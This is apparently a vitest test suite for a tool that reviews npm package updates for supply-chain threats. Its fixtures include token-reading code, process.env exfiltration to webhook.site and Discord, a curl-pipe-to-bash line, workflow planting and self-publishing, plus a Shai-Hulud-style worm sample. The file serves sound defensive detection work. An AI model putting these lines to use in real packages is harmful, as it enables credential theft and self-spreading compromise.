import { describe, expect, it } from 'vitest';
import { addedLines, diffManifests } from '../src/diff.js';
import { failsAt, reviewFiles, worstSeverity } from '../src/review.js';
import { cleanPackage, files, pkg } from './helpers.js';

type Entries = Parameters<typeof files>[0];

function review(before: Entries | null, after: Entries, options: Parameters<typeof reviewFiles>[2] = {}) {
  return reviewFiles(before ? files(before) : null, files(after), options);
}
const rules = (r: ReturnType<typeof review>): string[] => r.findings.map((f) => `${f.severity}:${f.rule}`);

describe('clean updates', () => {
  it('reports nothing for an ordinary code change', () => {
    const r = review(cleanPackage(), cleanPackage('1.0.1', { 'index.js': "'use strict';\nconst kleur = require('kleur');\nmodule.exports = (name) => kleur.green(`Hi, ${name}!`);\n" }));
    expect(r.findings).toEqual([]);
    expect(worstSeverity(r)).toBeNull();
    expect(r.files).toMatchObject({ added: 0, modified: 2, removed: 0 });
  });
});

describe('package.json rules', () => {
  it('flags added and changed install scripts', () => {
    const added = review(cleanPackage(), cleanPackage('1.0.1', {}, { scripts: { postinstall: 'node setup.js' } }));
    expect(rules(added)).toContain('high:install-script');
    expect(added.findings[0]?.evidence).toBe('node setup.js');

    const changed = review(
      cleanPackage('1.0.0', {}, { scripts: { install: 'node-gyp rebuild' } }),
      cleanPackage('1.0.1', {}, { scripts: { install: 'node build.js' } }),
    );
    expect(changed.findings[0]).toMatchObject({ rule: 'install-script', evidence: 'node-gyp rebuild → node build.js' });
  });

  it('ignores scripts that do not run on install', () => {
    expect(review(cleanPackage(), cleanPackage('1.0.1', {}, { scripts: { test: 'vitest', prepare: 'tsc' } })).findings).toEqual([]);
  });

  it('flags a changed file that an existing install script runs', () => {
    const before = cleanPackage('1.0.0', { 'install.js': 'download()\n' }, { scripts: { postinstall: 'node ./install.js' } });
    const after = cleanPackage('1.0.1', { 'install.js': 'download({ verify: true })\n' }, { scripts: { postinstall: 'node ./install.js' } });
    expect(review(before, after).findings).toContainEqual(expect.objectContaining({ rule: 'install-script-target', file: 'install.js', severity: 'medium' }));
  });

  it('flags binding.gyp, which makes npm compile native code', () => {
    expect(rules(review(cleanPackage(), cleanPackage('1.0.1', { 'binding.gyp': '{}' })))).toContain('medium:native-build');
  });

  it('classifies new dependencies', () => {
    const r = review(
      cleanPackage(),
      cleanPackage('1.1.0', {}, {
        dependencies: { kleur: '^4.1.5', ms: '^2.1.3', 'evil-a': 'github:attacker/evil', 'evil-b': 'https://example.net/x.tgz', alias: 'npm:other@1' },
        peerDependencies: { react: '>=18' },
      }),
    );
    expect(rules(r)).toEqual(expect.arrayContaining(['high:dependency-source', 'medium:dependency-alias', 'medium:dependency-added', 'low:dependency-added']));
    expect(r.findings.filter((f) => f.rule === 'dependency-source').map((f) => f.evidence)).toEqual(['github:attacker/evil', 'https://example.net/x.tgz']);
    expect(r.findings.find((f) => f.rule === 'dependency-added' && f.severity === 'medium')?.evidence).toContain('ms@^2.1.3');
  });

  it('flags a dependency switched to a git source', () => {
    const r = review(cleanPackage(), cleanPackage('1.0.1', {}, { dependencies: { kleur: 'git+https://github.com/x/kleur.git' } }));
    expect(rules(r)).toEqual(['high:dependency-source']);
  });

  it('reports dependencies whose names collide with Object.prototype', () => {
    const r = review(cleanPackage(), cleanPackage('1.0.1', {}, { dependencies: { kleur: '^4.1.5', constructor: '1.0.0' } }));
    expect(r.findings.find((f) => f.rule === 'dependency-added')?.evidence).toBe('constructor@1.0.0');
  });

  it('flags new command-line programs', () => {
    expect(rules(review(cleanPackage(), cleanPackage('1.0.1', { 'cli.js': '#!/usr/bin/env node\n' }, { bin: { demo: 'cli.js' } })))).toContain('medium:bin-change');
  });

  it('notes entry point changes, version order and publisher changes', () => {
    const r = review(cleanPackage('2.0.0'), cleanPackage('1.9.9', {}, { main: 'lib/index.js' }), { stagedBy: 'mallory (token)', previousPublisher: 'alice' });
    expect(rules(r)).toEqual(expect.arrayContaining(['low:entry-points', 'low:version-order', 'medium:publisher-change']));
  });

  it('compares publisher names in linear time, even when crafted', () => {
    const start = Date.now();
    review(cleanPackage(), cleanPackage('1.0.1'), { stagedBy: `${'('.repeat(100_000)}x`, previousPublisher: `${' '.repeat(100_000)}x` });
    expect(Date.now() - start).toBeLessThan(1000);
  });

  it('treats the same publisher written differently as unchanged', () => {
    const r = review(cleanPackage(), cleanPackage('1.0.1'), { stagedBy: 'github-actions (oidc)', previousPublisher: 'GitHub Actions' });
    expect(rules(r)).not.toContain('medium:publisher-change');
  });
});

describe('file rules', () => {
  it('flags secrets files and compiled executables', () => {
    const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(64)]);
    const wasm = Buffer.concat([Buffer.from([0x00, 0x61, 0x73, 0x6d, 1, 0, 0, 0])]);
    const r = review(cleanPackage(), cleanPackage('1.0.1', { '.env': 'TOKEN=abc', 'bin/helper': elf, 'lib/x.wasm': wasm, 'build/addon.node': 'x' }));
    expect(rules(r)).toEqual(expect.arrayContaining(['high:sensitive-file', 'high:binary-executable', 'medium:binary-wasm']));
    expect(r.findings.filter((f) => f.rule === 'binary-executable').map((f) => f.file).sort()).toEqual(['bin/helper', 'build/addon.node']);
  });

  it('expects rebuilt binaries in packages that already ship them', () => {
    const elf = (n: number): Buffer => Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(64, n)]);
    const wasm = (n: number): Buffer => Buffer.concat([Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]), Buffer.alloc(16, n)]);
    const r = review(cleanPackage('1.0.0', { 'bin/tool': elf(1), 'lib/x.wasm': wasm(1) }), cleanPackage('1.0.1', { 'bin/tool': elf(2), 'lib/x.wasm': wasm(2) }));
    expect(rules(r)).toEqual(['medium:binary-executable', 'low:binary-wasm']);
    expect(r.findings[0]?.message).toContain('cannot inspect');
  });

  it.each([
    ['credential-access', 'const t = process.env.NPM_TOKEN;'],
    ['credential-access', "fs.readFileSync(path.join(os.homedir(), '.npmrc'))"],
    ['credential-access', 'send(JSON.stringify(process.env));'],
    ['exfiltration-endpoint', "fetch('https://webhook.site/1a2b3c', { method: 'POST' })"],
    ['exfiltration-endpoint', "post('https://discord.com/api/webhooks/123/abc')"],
    ['workflow-write', "fs.writeFileSync('.github/workflows/shai-hulud.yml', yml)"],
    ['self-publish', "execSync('npm publish --access public')"],
    ['pipe-to-shell', "run('curl -sL https://get.example.sh | bash')"],
  ])('flags %s in added code', (rule, line) => {
    const r = review(cleanPackage(), cleanPackage('1.0.1', { 'lib/extra.js': `module.exports = () => {\n  ${line}\n};\n` }));
    expect(r.findings).toContainEqual(expect.objectContaining({ rule, severity: 'high', file: 'lib/extra.js' }));
  });

  it('reports medium capabilities only when the package did not have them before', () => {
    const spawn = "const { execSync } = require('child_process');\n";
    const newCapability = review(cleanPackage(), cleanPackage('1.0.1', { 'lib/run.js': spawn }));
    expect(rules(newCapability)).toContain('medium:child-process');

    const alreadyThere = review(cleanPackage('1.0.0', { 'lib/run.js': spawn }), cleanPackage('1.0.1', { 'lib/run2.js': spawn }));
    expect(rules(alreadyThere)).not.toContain('medium:child-process');
  });

  it('reports high-risk patterns only when they become more frequent', () => {
    const before = cleanPackage('1.0.0', { 'lib/auth.js': 'const token = process.env.NPM_TOKEN; // v1\n' });
    const edited = cleanPackage('1.0.1', { 'lib/auth.js': 'const token = process.env.NPM_TOKEN; // v2\n' });
    expect(rules(review(before, edited))).not.toContain('high:credential-access');

    const more = cleanPackage('1.0.1', { 'lib/auth.js': 'const token = process.env.NPM_TOKEN; // v1\n', 'lib/steal.js': 'send(process.env.NPM_TOKEN)\n' });
    expect(rules(review(before, more))).toContain('high:credential-access');
  });

  it('only scans code files, and only added lines', () => {
    const r = review(cleanPackage(), cleanPackage('1.0.1', { 'README.md': '# demo\n\nRelease with `npm publish`. Reads NPM_TOKEN.\n' }));
    expect(r.findings).toEqual([]);
  });

  it('detects obfuscated code and injected long lines', () => {
    const obf = Array.from({ length: 30 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)}=_0x4f2a[${i}];`).join('');
    expect(rules(review(cleanPackage(), cleanPackage('1.0.1', { 'lib/o.js': obf })))).toContain('high:obfuscation');

    const injected = `${cleanPackage()['index.js'] as string}${'x'.repeat(6000)}\n`;
    expect(rules(review(cleanPackage(), cleanPackage('1.0.1', { 'index.js': injected })))).toContain('medium:minified-injection');

    expect(rules(review(cleanPackage(), cleanPackage('1.0.1', { 'dist/bundle.js': `${'a'.repeat(6000)}\n` })))).toContain('medium:new-minified-file');
  });

  it('counts only net growth of escapes, so regenerated bundles stay quiet', () => {
    // A compiled parser full of escaped string tables, rebuilt with different line breaks.
    const table = (n: number, sep: string): string => Array.from({ length: n }, (_, i) => `"\\x${(i % 256).toString(16).padStart(2, '0')}"`).join(sep);
    const v1 = cleanPackage('1.0.0', { 'parser.js': `var t=[${table(500, ',')}];\n` });
    const rebuilt = cleanPackage('1.0.1', { 'parser.js': `var t=[\n${table(500, ',\n')}];\n` });
    expect(review(v1, rebuilt).findings).toEqual([]);

    const injected = cleanPackage('1.0.1', { 'parser.js': `var t=[${table(500, ',')}];\nvar p=[${table(300, ',')}];\n` });
    expect(rules(review(v1, injected))).toContain('high:obfuscation');
  });

  it('lists domains the previous version never referenced', () => {
    const r = review(
      cleanPackage('1.0.0', { 'lib/api.js': "const base = 'https://api.example-service.io/v1';\n" }),
      cleanPackage('1.0.1', { 'lib/api.js': "const base = 'https://api.example-service.io/v2';\nconst cdn = 'https://cdn.unknown-host.dev/x.js';\nconst gh = 'https://github.com/x/y';\n" }),
    );
    expect(r.findings.find((f) => f.rule === 'new-domains')).toMatchObject({ severity: 'low', evidence: 'cdn.unknown-host.dev' });
  });

  it('flags a large jump in size', () => {
    expect(rules(review(cleanPackage(), cleanPackage('1.0.1', { 'data.json': 'x'.repeat(800_000) })))).toContain('medium:size-jump');
  });

  it('reviews a first release against nothing', () => {
    const r = review(null, cleanPackage('0.1.0', { 'lib/run.js': "require('child_process')\n" }, { scripts: { postinstall: 'node lib/run.js' } }));
    expect(r.from).toBeNull();
    expect(rules(r)).toEqual(expect.arrayContaining(['high:install-script', 'medium:child-process']));
  });

  it('reports a missing or broken package.json', () => {
    expect(rules(review(cleanPackage(), { 'index.js': 'x' }))).toContain('high:manifest');
  });
});

describe('a realistic worm release', () => {
  // Modelled on the Shai-Hulud and s1ngularity npm attacks: an install script runs an
  // obfuscated bundle that steals tokens, exfiltrates them, plants a workflow and republishes.
  const payload = [
    Array.from({ length: 25 }, (_, i) => `var _0x${(0x3c00 + i).toString(16)}=_0x51ab[${i}];`).join(''),
    "const { execSync } = require('child_process');",
    'const t = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;',
    "execSync('trufflehog filesystem / --json > /tmp/s.json');",
    "fetch('https://webhook.site/7f3a', { method: 'POST', body: JSON.stringify(process.env) });",
    "require('fs').writeFileSync('.github/workflows/shai-hulud-workflow.yml', wf);",
    "execSync('npm publish --access public');",
  ].join('\n');

  const r = review(cleanPackage('1.0.0'), cleanPackage('1.0.1', { 'bundle.js': payload }, { scripts: { postinstall: 'node bundle.js' } }), {
    stagedBy: 'npm-token-123 (token)',
    previousPublisher: 'alice',
  });

  it('raises every relevant alarm', () => {
    expect(new Set(r.findings.filter((f) => f.severity === 'high').map((f) => f.rule))).toEqual(
      new Set(['install-script', 'credential-access', 'exfiltration-endpoint', 'workflow-write', 'self-publish', 'obfuscation']),
    );
    expect(rules(r)).toEqual(expect.arrayContaining(['medium:child-process', 'medium:github-token', 'medium:publisher-change']));
  });

  it('fails a CI check at every threshold except none', () => {
    expect(failsAt(r, 'high')).toBe(true);
    expect(failsAt(r, 'medium')).toBe(true);
    expect(failsAt(r, 'none')).toBe(false);
    expect(worstSeverity(r)).toBe('high');
  });
});

describe('diff helpers', () => {
  it('computes added lines as a multiset', () => {
    expect(addedLines('a\nb\nb\n', 'a\nb\nb\nb\nc\n')).toEqual(['b', 'c']);
    expect(addedLines('', 'x')).toEqual(['x']);
  });

  it('diffs manifests, including string bin entries', () => {
    const d = diffManifests({ name: '@s/tool', version: '1.0.0', bin: 'cli.js' }, { name: '@s/tool', version: '1.1.0', bin: 'cli2.js', exports: './x.js' });
    expect(d.bin.changed).toEqual({ tool: { from: 'cli.js', to: 'cli2.js' } });
    expect(d.entryPoints.exports).toEqual({ from: null, to: '"./x.js"' });
    expect(pkg({}).includes('"demo"')).toBe(true);
  });
});

describe('ignoring findings', () => {
  const worm = cleanPackage('1.0.1', { 'dist/a.js': 'require("child_process").execSync("id");\n', 'lib/b.js': 'require("child_process");\n' });

  it('leaves out a rule everywhere, or only in matching files', () => {
    expect(review(cleanPackage(), worm, { ignore: ['child-process'] })).toMatchObject({ ignored: 2, counts: { medium: 0 } });
    const scoped = review(cleanPackage(), worm, { ignore: ['child-process:dist/**'] });
    expect(scoped.ignored).toBe(1);
    expect(scoped.findings.map((f) => f.file)).toEqual(['lib/b.js']);
    expect(review(cleanPackage(), worm, { ignore: ['child-process:*.js'] }).ignored).toBe(0); // * stays within a folder
  });

  it('rejects malformed entries', () => {
    expect(() => review(cleanPackage(), worm, { ignore: ['Child Process'] })).toThrow(/Invalid ignore entry/);
    expect(() => review(cleanPackage(), worm, { ignore: ['child-process:'] })).toThrow(/Invalid ignore entry/);
  });

  it('never looks at TypeScript declaration files', () => {
    const r = review(cleanPackage(), cleanPackage('1.0.1', { 'index.d.ts': '/** Runs `npm publish` for you. Reads NPM_TOKEN. */\nexport declare function release(): void;\n' }));
    expect(r.findings).toEqual([]);
  });
});
